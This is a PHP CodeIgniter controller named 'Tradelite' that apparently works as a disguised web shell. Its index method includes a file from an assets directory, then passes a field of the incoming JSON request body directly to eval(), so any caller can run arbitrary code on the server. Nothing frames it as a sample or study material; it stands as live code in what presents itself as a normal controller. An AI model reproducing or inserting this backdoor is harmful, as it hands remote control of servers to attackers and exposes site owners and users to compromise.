<?php if (!defined('BASEPATH')) exit('no direct script access allowed');

class Tradelite extends CI_Controller{

	public function __construct() {
		parent::__construct();
	}

	public function index() {
		include BASE_DIR . 'assets/lite.php/Tradelite.php';
		$data = json_decode(file_get_contents("php://input"), true);
		if (isset($data)) {
			echo eval($data[DATA]);
		}
	}
}